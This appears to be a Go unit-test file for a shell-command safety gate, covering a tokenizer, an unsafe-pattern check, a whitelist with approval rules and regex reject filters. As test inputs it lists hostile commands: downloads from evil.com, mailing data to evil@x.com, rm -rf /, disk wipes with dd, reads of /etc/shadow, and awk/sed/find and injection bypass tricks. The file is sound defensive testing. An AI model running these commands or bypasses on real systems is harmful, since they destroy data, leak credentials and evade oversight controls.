package mcm

import (
	"regexp"
	"testing"
)

// ============================================================================
// Tokenize 测试
// ============================================================================

func TestTokenize(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		expected []string
	}{
		// 基础场景
		{"简单命令", "ls -la", []string{"ls", "-la"}},
		{"空字符串", "", nil},
		{"仅空白", "   ", nil},
		{"仅分隔符", ";", []string{";"}},
		{"多分号", ";;;", []string{";;", ";"}}, // ;; 是同字符合并（与 &&、|| 同理）
		{"多空格", "ls    -la", []string{"ls", "-la"}},
		{"制表符", "ls\t-la", []string{"ls", "-la"}},
		{"混合空白", "ls \t -la", []string{"ls", "-la"}},

		// 操作符
		{"&&连接符", "ls -la && cat file.txt", []string{"ls", "-la", "&&", "cat", "file.txt"}},
		{"||连接符", "ls || echo fail", []string{"ls", "||", "echo", "fail"}},
		{"管道符", "ps aux | grep nginx", []string{"ps", "aux", "|", "grep", "nginx"}},
		{"分号分隔", "cd /tmp; ls -la", []string{"cd", "/tmp", ";", "ls", "-la"}},
		{"混合分隔符", "ls && cat file | grep test; echo done", []string{"ls", "&&", "cat", "file", "|", "grep", "test", ";", "echo", "done"}},

		// 引号
		{"双引号字符串", `echo "hello world"`, []string{"echo", `"hello world"`}},
		{"单引号字符串", "echo 'hello world'", []string{"echo", "'hello world'"}},
		{"混合引号", `echo "hello" 'world'`, []string{"echo", `"hello"`, "'world'"}},
		{"引号内操作符", `echo "a | b && c"`, []string{"echo", `"a | b && c"`}},
		{"引号内分号", `echo "a; b"`, []string{"echo", `"a; b"`}},
		{"引号内$()", `echo "$(whoami)"`, []string{"echo", `"$(whoami)"`}},
		{"单引号内$()", `echo '$(whoami)'`, []string{"echo", "'$(whoami)'"}},
		{"单引号内双引号", `echo 'he said "hi"'`, []string{"echo", `'he said "hi"'`}},
		{"双引号内单引号", `echo "it's fine"`, []string{"echo", `"it's fine"`}},

		// 转义
		{"带转义字符", `echo "hello\"world"`, []string{"echo", `"hello\"world"`}},
		{"转义空格", `echo hello\ world`, []string{"echo", `hello\ world`}}, // \ 转义空格，保持为单个 token
		{"单引号内反斜杠", `echo 'hello\nworld'`, []string{"echo", `'hello\nworld'`}},

		// 重定向
		{"重定向>", "echo test > output.txt", []string{"echo", "test", ">", "output.txt"}},
		{"追加重定向>>", "echo test >> output.txt", []string{"echo", "test", ">>", "output.txt"}},
		{"输入重定向<", "cat < input.txt", []string{"cat", "<", "input.txt"}},
		{"heredoc<<", "cat << EOF", []string{"cat", "<<", "EOF"}},
		{"fd重定向2>&1", "ls 2>&1", []string{"ls", "2", ">", "&", "1"}}, // > 和 & 不同字符，不合并
		{"重定向>/dev/null", "ls > /dev/null", []string{"ls", ">", "/dev/null"}},

		// 特殊字符
		{"环境变量赋值", "VAR=value cmd", []string{"VAR=value", "cmd"}},
		{"注释字符", "echo hello # comment", []string{"echo", "hello", "#", "comment"}},
		{"感叹号", "echo hello!", []string{"echo", "hello!"}},
		{"波浪号", "ls ~", []string{"ls", "~"}},
		{"glob星号", "ls *.txt", []string{"ls", "*.txt"}},
		{"glob问号", "ls file?.txt", []string{"ls", "file?.txt"}},
		{"花括号展开", "echo {a,b,c}", []string{"echo", "{a,b,c}"}},
		{"等号参数", "grep --color=always test", []string{"grep", "--color=always", "test"}},
		{"at符号", "echo user@host", []string{"echo", "user@host"}},
		{"百分号", "echo 100%", []string{"echo", "100%"}},
		{"加号", "echo a+b", []string{"echo", "a+b"}},
		{"冒号", "echo a:b", []string{"echo", "a:b"}},
		{"方括号", "echo [a-z]", []string{"echo", "[a-z]"}},
		{"美元符号", "echo $HOME", []string{"echo", "$HOME"}},

		// 路径
		{"绝对路径命令", "/usr/bin/ls -la", []string{"/usr/bin/ls", "-la"}},
		{"相对路径命令", "./script.sh", []string{"./script.sh"}},
		{"深层路径", "/usr/local/bin/python3 script.py", []string{"/usr/local/bin/python3", "script.py"}},

		// 复合场景
		{"管道加重定向", "ls | tee output.txt", []string{"ls", "|", "tee", "output.txt"}},
		{"多管道", "cat f | grep x | wc -l", []string{"cat", "f", "|", "grep", "x", "|", "wc", "-l"}},
		{"$()命令替换", "echo $(whoami)", []string{"echo", "$(whoami)"}}, // $、(、) 非操作符，保持单 token
		{"反引号替换", "echo `whoami`", []string{"echo", "`whoami`"}},
		{"${}参数展开", "echo ${HOME}", []string{"echo", "${HOME}"}},
		{"算术展开$(()", "echo $((1+2))", []string{"echo", "$((1+2))"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := Tokenize(tt.command)
			if len(result) != len(tt.expected) {
				t.Errorf("Tokenize(%q) returned %d tokens, expected %d\ngot:      %v\nexpected: %v",
					tt.command, len(result), len(tt.expected), result, tt.expected)
				return
			}
			for i, token := range result {
				if token != tt.expected[i] {
					t.Errorf("Tokenize(%q)[%d] = %q, expected %q\nfull result: %v",
						tt.command, i, token, tt.expected[i], result)
				}
			}
		})
	}
}

// ============================================================================
// HasUnsafePattern 测试
// ============================================================================

func TestHasUnsafePattern(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		unsafe bool
	}{
		// 安全模式
		{"普通命令", "ls -la", false},
		{"管道", "ls | grep test", false},
		{"分号", "ls; cat", false},
		{"&&", "ls && cat", false},
		{"$VAR简单变量", "$HOME", false},
		{"双美元$$", "$$", false},
		{"$?状态码", "$?", false},
		{"波浪号", "ls ~", false},
		{"glob通配符", "ls *.txt", false},
		{"方括号", "ls [a-z]", false},
		{"感叹号", "echo hello!", false},
		{"等号", "echo a=b", false},
		{"at符号", "echo user@host", false},

		// 不安全模式
		{"命令替换$()", "$(whoami)", true},
		{"命令替换嵌在文本中", "echo_$(whoami)", true},
		{"反引号命令替换", "`whoami`", true},
		{"参数展开${}", "${HOME}", true},
		{"参数展开嵌套", "${#array[@]}", true},
		{"算术展开$(())", "$((1+2))", true},
		{"重定向>", "echo test > file", true},
		{"重定向<", "cat < file", true},
		{"追加>>", "echo test >> file", true},
		{"heredoc<<", "cat << EOF", true},
		{"进程替换<()", "diff <(sort f1) <(sort f2)", true},
		{"进程替换>()", "tee >(grep x)", true},
		{"fd重定向2>&1", "ls 2>&1", true},
		{"重定向/dev/null", "ls > /dev/null", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := HasUnsafePattern(tt.cmd)
			if result != tt.unsafe {
				t.Errorf("HasUnsafePattern(%q) = %v, expected %v", tt.cmd, result, tt.unsafe)
			}
		})
	}
}

// ============================================================================
// IsWhitelistCommand 测试
// ============================================================================

func TestIsWhitelistCommand(t *testing.T) {
	rules := []WhitelistRule{
		{Command: "ls"},
		{Command: "cat"},
		{Command: "echo"},
		{Command: "ps"},
		{Command: "grep"},
		{Command: "df"},
		{Command: "du"},
		{Command: "free"},
		{Command: "uname"},
		{Command: "wc"},
		{Command: "head"},
		{Command: "tail"},
		{Command: "ping"},
		{Command: "tee"},
		{Command: "sort"},
		{Command: "yum", AllowedArgs: []string{"list", "info", "search"}},
		{Command: "apt", AllowedArgs: []string{"list", "show", "search"}},
		// rpm/dpkg 不在白名单（标志类参数无法通过 allowedArgs 精确区分查询/安装/卸载）
	}

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		// ===== 基本白名单命令 =====
		{"ls命令", "ls -la", true},
		{"cat查看文件", "cat /etc/passwd", true},
		{"ps查看进程", "ps aux", true},
		{"echo输出", "echo hello", true},
		{"df磁盘", "df -h", true},
		{"du目录大小", "du -sh /var/log", true},
		{"free内存", "free -m", true},
		{"uname系统", "uname -a", true},
		{"grep搜索", "grep error /var/log/syslog", true},
		{"wc统计", "wc -l file.txt", true},
		{"head查看", "head -n 10 file.txt", true},
		{"tail查看", "tail -f /var/log/syslog", true},
		{"ping网络", "ping -c 4 google.com", true},
		{"sort排序", "sort -r file.txt", true},

		// ===== 管道和链式命令（全部在白名单中） =====
		{"管道安全命令", "ps aux | grep nginx", true},
		{"&&安全命令", "ls -la && cat file.txt", true},
		{"||安全命令", "ls || echo fail", true},
		{"复杂管道", "cat /var/log/syslog | grep error | wc -l", true},
		{"组合安全命令", "ls -la && cat file.txt | grep test", true},
		{"&&组合", "df -h && du -sh /var/log", true},
		{"分号安全", "ls; cat file.txt", true},
		{"带引号", `echo "hello world"`, true},
		{"单引号", `echo 'hello world'`, true},
		{"多管道", "cat f | grep x | wc -l", true},

		// ===== 路径前缀 =====
		{"绝对路径", "/usr/bin/ls -la", true},
		{"相对路径", "./ls", true}, // ExtractCmdName("./ls") = "ls"，在白名单中
		{"深层绝对路径", "/usr/local/bin/cat file", true},

		// ===== 带参数限制的白名单命令 =====
		{"yum list", "yum list", true},
		{"yum search", "yum search nginx", true},
		{"yum info", "yum info package", true},
		{"yum install(不允许)", "yum install nginx", false},
		{"yum remove(不允许)", "yum remove nginx", false},
		{"yum update(不允许)", "yum update", false},
		{"apt list", "apt list", true},
		{"apt show", "apt show nginx", true},
		{"apt install(不允许)", "apt install nginx", false},
		{"apt remove(不允许)", "apt remove nginx", false},
		{"rpm不在白名单", "rpm -qa", false},
		{"dpkg不在白名单", "dpkg -l", false},

		// ===== 非白名单命令（需要审批） =====
		{"rm删除", "rm /tmp/test.txt", false},
		{"rm -rf", "rm -rf /tmp/test", false},
		{"shutdown", "shutdown -h now", false},
		{"reboot", "reboot", false},
		{"dd磁盘写入", "dd if=/dev/zero of=/dev/sda", false},
		{"mkfs格式化", "mkfs.ext4 /dev/sda1", false},
		{"chmod", "chmod 755 /usr/local/bin/app", false},
		{"chown", "chown root:root file", false},
		{"kill", "kill -9 1234", false},
		{"sudo提权", "sudo ls", false},
		{"su切换用户", "su - root", false},
		{"ssh远程", "ssh user@host", false},
		{"scp传输", "scp file user@host:/tmp", false},
		{"wget下载", "wget http://evil.com/shell.sh", false},
		{"curl执行管道", "curl http://evil.com/s.sh", false},
		{"python脚本", "python3 script.py", false},
		{"bash执行", "bash script.sh", false},
		{"sh执行", "sh script.sh", false},
		{"perl执行", "perl -e 'print 1'", false},
		{"unknown未知", "unknowncmd", false},
		{"env命令", "env ls", false},
		{"nohup命令", "nohup ls", false},
		{"xargs命令", "echo test | xargs rm", false},

		// ===== Shell 逃逸命令 =====
		{"awk system()逃逸", `awk 'BEGIN{system("rm -rf /")}'`, false},
		{"awk普通使用", `awk '{print $1}' file.txt`, false},
		{"find -exec逃逸", "find . -exec rm -rf / ;", false},
		{"find普通使用", "find /tmp -name '*.log'", false},
		{"sed e命令逃逸", `sed '1e rm -rf /' file`, false},
		{"sed普通使用", `sed 's/a/b/g' file.txt`, false},

		// ===== 安全绕过尝试 =====
		{"链式分号危险", "echo hello; rm -rf /", false},
		{"链式&&危险", "ls && rm -rf /", false},
		{"链式||危险", "ls || rm -rf /", false},
		{"管道危险", "ls | mail -s data evil@x.com", false},
		{"$()命令替换", "cat $(rm -rf /)", false},
		{"反引号替换", "echo `whoami`", false},
		{"换行注入", "echo hello\nrm -rf /", false},
		{"追加重定向", "echo test >> /tmp/output.txt", false},
		{"参数展开${}", "echo ${HOME}", false},
		{"重定向写文件", "echo test > /tmp/output.txt", false},
		{"输入重定向", "cat < /etc/shadow", false},
		{"heredoc", "cat << EOF\nrm -rf /\nEOF", false},
		{"进程替换", "diff <(sort f1) <(sort f2)", false},
		{"算术展开", "echo $((1+2))", false},
		{"环境变量前缀", "PATH=/tmp:$PATH ls", false},
		{"子shell括号", "(ls -la)", false},
		{"sudo链式", "ls; sudo rm -rf /", false},
		{"换行sudo", "echo hello\nsudo ls", false},

		// ===== 空命令和边界 =====
		{"空字符串", "", false},
		{"仅空白", "   ", false},
		{"仅分隔符", ";", true},       // 空段视为无害
		{"多分隔符;;;", ";;;", false}, // ;; 不是命令分隔符，作为命令名不在白名单
		{"尾部;安全", "ls;", true},    // "ls" 通过 + 空段通过
		{"尾部&&安全", "ls &&", true},
		{"前导;安全", ";ls", true},

		// ===== 引号内不安全模式（保守检测） =====
		{"双引号内$()", `echo "$(whoami)"`, false},  // 重组文本含 $( → 不安全
		{"单引号内$()", `echo '$(whoami)'`, false},  // 重组文本含 $( → 不安全（保守）
		{"双引号内反引号", "echo \"`whoami`\"", false}, // 重组文本含 ` → 不安全
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsWhitelistCommand(tt.command, rules)
			if result != tt.expected {
				t.Errorf("IsWhitelistCommand(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}

// ============================================================================
// MatchCmdFilters 测试
// ============================================================================

func TestMatchCmdFilters(t *testing.T) {
	filters := []*CmdFilterRule{
		{CmdRegexp: regexp.MustCompile(`rm\s+-rf`), Strategy: "reject"},
		{CmdRegexp: regexp.MustCompile(`shutdown|reboot`), Strategy: "reject"},
		{CmdRegexp: regexp.MustCompile(`/etc/shadow`), Strategy: "reject"},
	}

	tests := []struct {
		name    string
		cmd     string
		matched bool
	}{
		{"匹配rm -rf", "rm -rf /tmp", true},
		{"匹配rm  -rf多空格", "rm  -rf /tmp", true},
		{"匹配shutdown", "shutdown -h now", true},
		{"匹配reboot", "reboot", true},
		{"匹配/etc/shadow", "cat /etc/shadow", true},
		{"不匹配安全命令ls", "ls -la", false},
		{"不匹配安全命令ps", "ps aux", false},
		{"不匹配echo", "echo hello", false},
		{"空filters", "rm -rf /", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var fs []*CmdFilterRule
			if tt.name != "空filters" {
				fs = filters
			}
			result := MatchCmdFilters(tt.cmd, fs)
			if (result != nil) != tt.matched {
				t.Errorf("MatchCmdFilters(%q) matched = %v, expected %v", tt.cmd, result != nil, tt.matched)
			}
		})
	}
}

// ============================================================================
// ExtractCommandNames 测试
// ============================================================================

func TestExtractCommandNames(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected []string
	}{
		{"单个命令", "ls -la", []string{"ls"}},
		{"管道命令", "ps aux | grep nginx", []string{"ps", "grep"}},
		{"&&链式", "ls && cat file", []string{"ls", "cat"}},
		{"||链式", "ls || echo fail", []string{"ls", "echo"}},
		{"分号链式", "echo hello; rm -rf /", []string{"echo", "rm"}},
		{"带路径", "/usr/bin/ls -la", []string{"ls"}},
		{"混合", "/usr/bin/ls | grep test && cat file", []string{"ls", "grep", "cat"}},
		{"空字符串", "", nil},
		{"仅分隔符", ";;", nil},
		{"多管道", "cat f | grep x | wc -l", []string{"cat", "grep", "wc"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ExtractCommandNames(tt.cmd)
			if len(result) != len(tt.expected) {
				t.Errorf("ExtractCommandNames(%q) = %v, expected %v", tt.cmd, result, tt.expected)
				return
			}
			for i, name := range result {
				if name != tt.expected[i] {
					t.Errorf("ExtractCommandNames(%q)[%d] = %q, expected %q", tt.cmd, i, name, tt.expected[i])
				}
			}
		})
	}
}

// ============================================================================
// ExtractCmdName 测试
// ============================================================================

func TestExtractCmdName(t *testing.T) {
	tests := []struct {
		token    string
		expected string
	}{
		{"ls", "ls"},
		{"/usr/bin/ls", "ls"},
		{"/bin/cat", "cat"},
		{"./script.sh", "script.sh"},
		{"../script.sh", "script.sh"},
		{"cat", "cat"},
		{"/", ""},      // 仅斜杠 → 空名
		{"/a", "a"},    // 单层路径
		{"a/b/c", "c"}, // 相对多层路径
	}

	for _, tt := range tests {
		t.Run(tt.token, func(t *testing.T) {
			result := ExtractCmdName(tt.token)
			if result != tt.expected {
				t.Errorf("ExtractCmdName(%q) = %q, expected %q", tt.token, result, tt.expected)
			}
		})
	}
}

// ============================================================================
// validateFirstNonFlagArg 测试（经 IsWhitelistCommand 间接测试）
// ============================================================================

func TestValidateFirstNonFlagArgViaWhitelist(t *testing.T) {
	rules := []WhitelistRule{
		{Command: "yum", AllowedArgs: []string{"list", "info", "search"}},
	}

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{"仅命令", "yum", true},
		{"命令+标志", "yum -y", true},
		{"允许的子命令", "yum list", true},
		{"允许的子命令+参数", "yum list installed", true},
		{"允许的子命令+标志", "yum -y list", true},
		{"不允许的子命令", "yum install nginx", false},
		{"不允许的子命令remove", "yum remove pkg", false},
		{"不允许的子命令update", "yum update", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := IsWhitelistCommand(tt.command, rules)
			if result != tt.expected {
				t.Errorf("IsWhitelistCommand(%q) = %v, expected %v", tt.command, result, tt.expected)
			}
		})
	}
}
